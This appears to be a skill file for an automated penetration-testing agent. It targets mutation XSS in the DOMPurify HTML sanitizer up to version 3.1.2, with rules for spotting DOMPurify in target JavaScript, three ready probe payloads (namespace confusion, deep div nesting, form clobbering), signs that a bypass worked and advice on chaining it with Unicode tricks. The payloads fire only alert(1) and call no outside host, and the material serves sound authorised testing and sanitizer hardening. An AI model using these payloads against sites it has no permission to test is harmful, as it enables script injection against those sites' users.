---
name: dompurify-mxss-bypass
description: Mutation XSS (mXSS) bypasses against DOMPurify HTML sanitizer. Use when DOMPurify.sanitize() detected in target JS source (CDN include or npm module).
---

# DOMPurify mXSS Bypass

## Pattern
- `DOMPurify.sanitize()` calls in JavaScript source
- CDN includes: `cdn.jsdelivr.net/npm/dompurify` or `cdnjs.cloudflare.com/ajax/libs/dompurify`
- Sanitized HTML inserted via `.innerHTML` or `.outerHTML`
- Version <=3.1.2 (check JS global `DOMPurify.version`)

## Probe
**Namespace Confusion (<=3.1.2):**
```html
<svg><title><img src=x onerror=alert(1)><caption><caption></caption></caption></title></svg>
```
**Node Flattening (<=3.1.2)** — 506+ nested divs trigger DOM parser mutation:
```html
<div><div>...[506 nested]...</div><svg><style>alert(1)</style></svg></div>
```
**DOM Clobbering Depth Reset (<=3.1.1):**
```html
<form id="parentNode"><form>...[508 nested forms]...</form></form><style>alert(1)</style>
```
Key: DOMPurify sanitizes the HTML **string** safely, but browser re-parsing into DOM causes **mutation** that creates executable context. Namespace boundary between HTML/SVG/MathML is the primary attack surface.

## Indicators
- Payload executes despite DOMPurify presence in source code
- Works only after DOM insertion (string looks safe, DOM isn't)
- Deep nesting or namespace tags succeed when simple XSS payloads fail

## Chain With
- unicode-normalization-bypass (Unicode payload variants through sanitizer)

## Reference
https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
